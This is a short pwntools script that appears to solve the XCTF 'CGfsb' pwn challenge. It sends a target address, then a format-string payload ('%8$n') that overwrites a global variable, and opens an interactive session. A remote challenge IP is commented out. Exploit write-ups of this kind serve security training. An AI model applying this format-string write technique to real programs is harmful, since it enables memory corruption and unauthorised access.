from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

#r = remote('111.200.241.244',64223)
elf_path    = './xctf_pwn_010_CGfsb'
io          = process(elf_path)
elf         = ELF(elf_path)

pwnme_addr  = 0x0804A068

io.recv()
io.sendline(b"AA"+p32(pwnme_addr))
io.recv()
io.sendline("a"*8 + "%8$n")
io.interactive()